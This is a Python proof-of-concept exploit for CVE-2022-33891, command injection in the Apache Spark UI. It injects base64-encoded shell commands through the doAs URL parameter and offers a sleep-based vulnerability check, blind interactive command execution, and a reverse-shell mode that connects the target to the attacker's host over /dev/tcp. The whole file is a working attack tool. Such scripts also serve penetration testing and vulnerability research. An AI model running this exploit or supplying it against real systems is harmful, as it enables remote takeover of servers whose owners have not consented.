#!/usr/bin/env python3
import requests
import argparse
import base64
import datetime


parser = argparse.ArgumentParser(description='CVE-2022-33891 Python POC Exploit Script')
parser.add_argument('-u', '--url', help='URL to exploit.', required=True)
parser.add_argument('-p', '--port', help='Exploit target\'s port.', required=True)
parser.add_argument('--revshell', default=False, action="store_true", help="Reverse Shell option.")
parser.add_argument('-lh', '--listeninghost', help='Your listening host IP address.')
parser.add_argument('-lp', '--listeningport', help='Your listening host port.')
parser.add_argument('--check', default=False, action="store_true", help="Checks if the target is exploitable with a sleep test")

args = parser.parse_args()

full_url = f"{args.url}:{args.port}"


def check_for_vuln(url):
    print("[*] Attempting to connect to site...")
    r = requests.get(f"{full_url}/?doAs='testing'", allow_redirects=False)
    if r.status_code != 403:
        print("[-] Does not look like an Apache Spark server.")
        quit(1)
    elif "org.apache.spark.ui" not in r.content.decode("utf-8"):
        print("[-] Does not look like an Apache Spark server.")
        quit(1)
    else:
        print("[*] Performing sleep test of 10 seconds...")
        t1 = datetime.datetime.now()
        run_cmd("sleep 10")
        t2 = datetime.datetime.now()
        delta = t2-t1
        if delta.seconds < 10:
            print("[-] Sleep was less than 10. This target is probably not vulnerable")
        else:
            print("[+] Sleep was 10 seconds! This target is probably vulnerable!")
        exit(0)


def cmd_prompt():
    # Provide user with cmd prompt on loop to run commands
    cmd = input("> ")
    return cmd


def base64_encode(cmd):
    message_bytes = cmd.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_cmd = base64_bytes.decode('ascii')
    return base64_cmd


def run_cmd(cmd):
    try:
        # Execute given command from cmd prompt
        #print("[*] Command is: " + cmd)
        base64_cmd = base64_encode(cmd)
        #print("[*] Base64 command is: " + base64_cmd)
        exploit = f"/?doAs=`echo {base64_cmd} | base64 -d | bash`"
        exploit_req = f"{full_url}{exploit}"
        print("[*] Full exploit request is: " + exploit_req)
        requests.get(exploit_req, allow_redirects=False)
    except Exception as e:
        print(str(e))


def revshell(lhost, lport):
    print(f"[*] Reverse shell mode.\n[*] Set up your listener by entering the following:\n nc -nvlp {lport}")
    input("[!] When your listener is set up, press enter!")
    rev_shell_cmd = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    run_cmd(rev_shell_cmd)

def main():

    if args.check and args.revshell:
        print("[!] Please choose either revshell or check!")
        exit(1)

    elif args.check:
        check_for_vuln(full_url)

    # Revshell
    elif args.revshell:
        if not (args.listeninghost and args.listeningport):
            print("[x] You need a listeninghost and listening port!")
            exit(1)
        else:
            lhost = args.listeninghost
            lport = args.listeningport
            revshell(lhost, lport)
    else:
        # "Interactive" mode
        print("[*] \"Interactive\" mode!\n[!] Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.")
        while True:
            command_to_run = cmd_prompt()
            run_cmd(command_to_run)


if __name__ == "__main__":
    main()
